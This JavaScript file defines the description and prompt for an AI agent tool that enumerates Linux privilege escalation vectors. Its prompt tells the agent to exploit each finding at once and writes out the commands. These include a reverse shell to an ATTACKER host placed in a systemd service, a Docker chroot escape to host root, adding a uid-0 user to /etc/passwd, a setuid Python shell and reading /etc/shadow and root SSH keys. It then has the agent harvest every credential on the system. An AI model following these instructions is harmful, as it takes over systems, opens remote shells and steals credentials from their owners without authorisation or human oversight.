import { PRIV_ESC_TOOL_NAME } from './constants.js'

export const DESCRIPTION = `Linux privilege escalation enumeration — checks SUID, sudo, cron, capabilities, PATH, Docker, NFS, writable /etc/passwd, polkit/PwnKit, writable systemd services.`

export const PROMPT = `## ${PRIV_ESC_TOOL_NAME} — Linux Privilege Escalation Enumeration

Enumerates common Linux privilege escalation vectors on the current system. Run \`action=all\` first after getting a shell.

### ESCALATION RULE — after identifying a vector, exploit immediately:
- NOPASSWD sudo → \`sudo <command>\` or \`sudo /bin/bash\`
- Writable cron script → inject reverse shell command
- Docker group → \`docker run -v /:/host -it alpine chroot /host sh\` (full host root)
- PwnKit (polkit ESC) → run pkexec exploit (CVE-2021-4034) for instant root
- Writable systemd service → add \`ExecStart=/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1\` + systemctl restart <service>
- Writable /etc/passwd → echo 'evil::0:0:root:/root:/bin/bash' >> /etc/passwd; su evil
- cap_setuid binary → use to spawn SUID-elevated shell: e.g. python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
- cap_dac_read_search binary → read any file: /etc/shadow, /root/.ssh/id_rsa, app secrets
- cap_sys_ptrace binary → gdb/strace attach to root process → dump memory for credentials
- cap_dac_override binary → overwrite any file: inject to /etc/cron.d/ or /root/.ssh/authorized_keys

After root: CredHarvestTool action=deep path=/ for all credentials on the system.

### Actions
- \`suid\` — find SUID/SGID binaries (non-standard paths are high severity)
- \`sudo\` — check sudo permissions via \`sudo -l\` (NOPASSWD = critical)
- \`cron\` — list all crontabs + find world-writable cron scripts
- \`capabilities\` — check Linux capabilities via getcap (cap_setuid/cap_setgid = critical)
- \`path_hijack\` — check for writable directories in current PATH
- \`writable_dirs\` — find world-writable directories (excl. /proc)
- \`docker\` — Docker socket writable / membership in docker group (= host root)
- \`nfs\` — NFS exports with no_root_squash (remote root file write)
- \`writable_passwd\` — writable /etc/passwd or /etc/shadow (add uid-0 user / crack hashes)
- \`polkit\` — PwnKit check: pkexec SUID + polkit < 0.120 = CVE-2021-4034 (instant local root on unpatched systems)
- \`systemd\` — find writable systemd service files (modify ExecStart to run as root)
- \`all\` — run all checks above (recommended first step after shell)

### Output
Returns findings grouped by check, each with severity and items list.

### Examples
- First step post-shell: \`{ action: "all" }\`
- Quick sudo check: \`{ action: "sudo" }\`
- SUID scan: \`{ action: "suid", timeout_secs: 60 }\`
- Container escape check: \`{ action: "docker" }\`
`
